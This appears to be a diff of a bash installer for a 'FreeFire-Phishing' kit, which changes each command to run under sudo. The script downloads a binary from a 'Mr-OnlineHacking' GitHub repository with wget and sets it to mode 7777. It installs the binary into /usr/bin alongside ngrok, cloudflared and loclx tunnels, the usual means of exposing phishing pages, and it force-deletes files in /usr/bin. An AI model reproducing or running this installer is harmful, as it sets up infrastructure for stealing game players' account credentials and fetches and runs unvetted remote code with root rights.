@@ -1,7 +1,7 @@
 #!/bin/bash
 echo ""
-rm -rf FreeFire-Phishing
-wget -q https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/FreeFire/SM/Files/Linux/FreeFire-Phishing > /dev/null
+sudo rm -rf FreeFire-Phishing
+sudo wget -q https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/FreeFire/SM/Files/Linux/FreeFire-Phishing > /dev/null
 clear
 echo ""
 
@@ -173,14 +173,14 @@ fi
 
 uninstall() {
 echo -e ""
-rm -rf /usr/bin/ngrok
-rm -rf /usr/bin/cloudflared
-rm -rf /usr/bin/loclx
-rm -rf /usr/bin/.SUMAN/1 /usr/bin/.SUMAN/2 /usr/bin/.SUMAN/3 /usr/bin/.SUMAN/4 /usr/bin/.SUMAN/5 /usr/bin/.SUMAN/6 /usr/bin/.SUMAN/7 /usr/bin/.SUMAN/8 /usr/bin/.SUMAN/9 /usr/bin/.SUMAN/0
-rm -rf /usr/bin/FF
-rm -rf /usr/bin/FreeFire
-rm -rf /usr/bin/FreeFire-Phishing
-rm -rf /usr/bin/OnlineHacking
+sudo rm -rf /usr/bin/ngrok
+sudo rm -rf /usr/bin/cloudflared
+sudo rm -rf /usr/bin/loclx
+sudo rm -rf /usr/bin/.SUMAN/1 /usr/bin/.SUMAN/2 /usr/bin/.SUMAN/3 /usr/bin/.SUMAN/4 /usr/bin/.SUMAN/5 /usr/bin/.SUMAN/6 /usr/bin/.SUMAN/7 /usr/bin/.SUMAN/8 /usr/bin/.SUMAN/9 /usr/bin/.SUMAN/0
+sudo rm -rf /usr/bin/FF
+sudo rm -rf /usr/bin/FreeFire
+sudo rm -rf /usr/bin/FreeFire-Phishing
+sudo rm -rf /usr/bin/OnlineHacking
 echo -e ""
 }
 
@@ -332,29 +332,29 @@ clear
 ngroktoken
 
 echo
-cp -R cloudflared ngrok loclx .SUMAN/1/
-cp -R cloudflared ngrok loclx .SUMAN/2/
-cp -R cloudflared ngrok loclx .SUMAN/3/
-cp -R cloudflared ngrok loclx .SUMAN/4/
-cp -R cloudflared ngrok loclx .SUMAN/5/
-cp -R cloudflared ngrok loclx .SUMAN/6/
-cp -R cloudflared ngrok loclx .SUMAN/7/
-cp -R cloudflared ngrok loclx .SUMAN/8/
-cp -R cloudflared ngrok loclx .SUMAN/9/
-cp -R cloudflared ngrok loclx .SUMAN/0/
-chmod 7777 FreeFire-Phishing
+sudo cp -R cloudflared ngrok loclx .SUMAN/1/
+sudo cp -R cloudflared ngrok loclx .SUMAN/2/
+sudo cp -R cloudflared ngrok loclx .SUMAN/3/
+sudo cp -R cloudflared ngrok loclx .SUMAN/4/
+sudo cp -R cloudflared ngrok loclx .SUMAN/5/
+sudo cp -R cloudflared ngrok loclx .SUMAN/6/
+sudo cp -R cloudflared ngrok loclx .SUMAN/7/
+sudo cp -R cloudflared ngrok loclx .SUMAN/8/
+sudo cp -R cloudflared ngrok loclx .SUMAN/9/
+sudo cp -R cloudflared ngrok loclx .SUMAN/0/
+sudo chmod 7777 FreeFire-Phishing
 clear
 echo
 uninstall
 echo
-cp -R ngrok /usr/bin/
-cp -R cloudflared /usr/bin/
-cp -R loclx /usr/bin/
-cp -R .SUMAN /usr/bin/
-cp -R FF /usr/bin/
-cp -R FreeFire /usr/bin/
-cp -R FreeFire-Phishing /usr/bin/
-cp -R OnlineHacking /usr/bin/
+sudo cp -R ngrok /usr/bin/
+sudo cp -R cloudflared /usr/bin/
+sudo cp -R loclx /usr/bin/
+sudo cp -R .SUMAN /usr/bin/
+sudo cp -R FF /usr/bin/
+sudo cp -R FreeFire /usr/bin/
+sudo cp -R FreeFire-Phishing /usr/bin/
+sudo cp -R OnlineHacking /usr/bin/
 clear
 echo
 logo
